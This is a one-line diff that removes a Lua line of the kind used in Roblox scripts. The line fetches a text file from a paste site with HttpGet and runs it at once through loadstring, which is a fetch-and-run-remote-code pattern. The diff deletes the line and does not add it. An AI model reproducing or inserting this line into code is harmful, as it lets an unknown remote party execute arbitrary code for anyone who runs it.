@@ -1,1 +1,0 @@
-loadstring(game:HttpGet(("https://paste.website/p/8b9a011b-e4df-45e8-8010-d23e619edcbe.txt"), true))()
